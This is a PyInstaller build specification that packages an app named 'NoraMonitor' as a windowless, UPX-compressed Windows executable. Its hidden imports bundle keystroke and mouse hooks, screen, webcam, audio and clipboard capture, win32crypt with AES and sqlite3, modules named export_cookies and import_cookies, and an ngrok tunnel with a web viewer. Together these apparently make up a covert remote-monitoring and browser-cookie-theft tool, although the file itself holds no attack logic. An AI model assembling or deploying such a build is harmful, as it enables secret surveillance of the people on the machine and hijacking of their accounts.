# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['app.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('templates/viewer.html', 'templates'),
    ],
    hiddenimports=[
        # Flask / SocketIO
        'flask_socketio',
        'engineio',
        'engineio.async_drivers',
        'engineio.async_drivers.threading',
        'socketio',
        'socketio.exceptions',
        # pynput
        'pynput',
        'pynput.keyboard',
        'pynput.keyboard._win32',
        'pynput.mouse',
        'pynput.mouse._win32',
        # win32
        'win32api',
        'win32con',
        'win32gui',
        'win32process',
        'win32security',
        'win32crypt',
        'winerror',
        'pywintypes',
        # crypto
        'Cryptodome',
        'Cryptodome.Cipher',
        'Cryptodome.Cipher.AES',
        'Cryptodome.Protocol',
        'Cryptodome.Protocol.KDF',
        # misc
        'mss',
        'mss.windows',
        'cv2',
        'numpy',
        'PIL',
        'PIL.Image',
        'pyaudio',
        'sounddevice',
        'psutil',
        'pyperclip',
        'pyngrok',
        'sqlite3',
        'pyautogui',
        'requests',
        'export_cookies',
        'import_cookies',
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='NoraMonitor',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
